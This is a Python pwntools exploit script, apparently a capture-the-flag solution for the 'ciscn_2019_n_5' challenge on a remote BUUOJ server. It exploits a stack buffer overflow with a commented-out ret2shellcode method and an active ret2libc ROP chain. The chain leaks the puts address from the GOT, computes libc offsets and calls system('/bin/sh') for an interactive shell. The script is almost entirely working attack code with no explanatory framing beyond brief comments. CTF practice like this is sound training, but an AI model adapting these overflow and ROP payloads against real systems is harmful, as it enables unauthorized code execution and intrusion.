from LibcSearcher import LibcSearcher
from pwn import *

elf = ELF('../ciscn_2019_n_5')

r = remote('node5.buuoj.cn', 25202)

context(os = 'linux',arch = 'amd64',log_level = 'debug')
context.log_level = 'debug'

'''
# 方法1：ret2shellcode
# 写入shellcode到name的bss段，再通过text溢出调用
shellcode = asm(shellcraft.amd64.linux.sh(), arch="amd64")
r.sendlineafter('tell me your name\n', shellcode)

name_addr = 0x601080
payload = b'a' * 0x20 + p64(0) + p64(name_addr)
r.sendlineafter('What do you want to say to me?\n', payload)
r.interactive()
'''

# 方法2：retlibc3
# 64位ROP, puts函数
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.sym['main']
pop_ret = 0x400713
ret_addr = 0x4004c9

payload2 = b'a' * 0x20 + p64(0) + p64(pop_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)

r.sendlineafter('tell me your name\n', '123')
r.sendlineafter('What do you want to say to me?\n', payload2)
puts_addr = u64(r.recvuntil(b'\x7f').ljust(8, b'\x00'))
print(hex(puts_addr))  # 0x7f618b6519c0

# 使用LibcSearcher
# libc = LibcSearcher('puts', puts_addr)
# base_addr = puts_addr - libc.dump('puts')
# system_addr = base_addr + libc.dump('system')
# bash_addr = base_addr + libc.dump('str_bin_sh')
# 使用so文件
libc = ELF(r'../lib/libc6_2.27-0ubuntu3_amd64.so')
system_offset = libc.sym['system']
puts_offset = libc.sym['puts']
bash_offset = libc.search(b'/bin/sh').__next__()

base_addr = puts_addr - puts_offset
system_addr = base_addr + system_offset
bash_addr = base_addr + bash_offset

print(hex(system_addr))  # 0x7f0450739440
print(hex(bash_addr))  # 0x7f045089de9a

puts_payload = b'a' * 0x20 + p64(0) + p64(ret_addr) + p64(pop_ret) + p64(bash_addr) + p64(system_addr)
r.sendlineafter('tell me your name\n', '123')
r.sendlineafter('What do you want to say to me?\n', puts_payload)
r.interactive()
